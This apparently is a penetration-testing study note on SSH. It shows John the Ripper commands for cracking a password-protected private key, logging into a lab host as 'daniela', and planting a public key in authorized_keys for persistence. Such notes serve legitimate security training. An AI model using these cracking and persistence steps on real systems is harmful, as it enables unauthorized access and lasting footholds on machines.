# 22 - SSH

### **Cracking a Password-Protected `id_rsa` Private Key**

1.  Set secure permissions for the key:

    ```sh
    chmod 600 id_rsa
    ```
2.  Convert the RSA private key to John-the-Ripper format:

    ```bash
    ssh2john id_rsa > ssh.hash
    ```
3.  Crack the password:

    {% code overflow="wrap" %}
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
    ```
    {% endcode %}
4.  _(Optional)_ Use custom rules for a more targeted attack:

    {% code overflow="wrap" %}
    ```bash
    sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
    john --wordlist=ssh.passwords --rules=sshRules ssh.hash
    ```
    {% endcode %}
5.  Once cracked, use the key to SSH into the target:

    ```bash
    ssh -i id_rsa daniela@192.168.50.244
    ```

### **Setting Up SSH Key-Based Access (Persistence or Initial Access)**

1.  Generate SSH key pair on your machine:

    ```bash
    ssh-keygen -t rsa -b 4096
    ```
2. Copy the content of `id_rsa.pub`.
3.  On the target machine:

    {% code overflow="wrap" %}
    ```bash
    mkdir -p ~/.ssh # in home dir
    chmod 700 ~/.ssh
    nano ~/.ssh/authorized_keys  # paste the public key content
    chmod 600 ~/.ssh/authorized_keys
    ```
    {% endcode %}
4.  Back on your machine, SSH into the target:

    ```bash
    ssh username@target_ip
    ```
